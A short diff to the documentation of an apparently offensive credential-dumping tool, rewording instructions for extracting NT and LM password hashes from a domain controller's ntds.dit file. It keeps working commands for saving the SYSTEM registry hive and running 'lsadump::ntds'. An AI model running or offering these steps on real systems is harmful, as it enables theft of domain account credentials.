@@ -245,7 +245,7 @@ Retrieve the hashes (nt and lm hash) of the users saved on the current ntds.dit 
 1) ntds (path to the ntds.dit file) \[**required**\]  
 2) system (path to the system hive file of the server the ntds.dit file is from) \[**required**\]   
 in order for this to work you need to get the files like that:  
-1) the ntds.dit file get however you want, but if it fails you will need to repair it with the following command ``` esentutl /p <path_to_ntds_file> ```  
+1) the ntds.dit file, get however you want, but if it is damaged, you will need to repair it with the following command ``` esentutl /p <path_to_ntds_file> ```  
 2) the system hive you **must** get with the following command ``` reg save HKLM\SYSTEM System.hiv ```  
 ```
 WolfCrack # lsadump::ntds /ntds:"C:\Users\yuval_000\Desktop\ntds.dit" /system:"C:\Users\yuval_000\Desktop\SYSTEM"
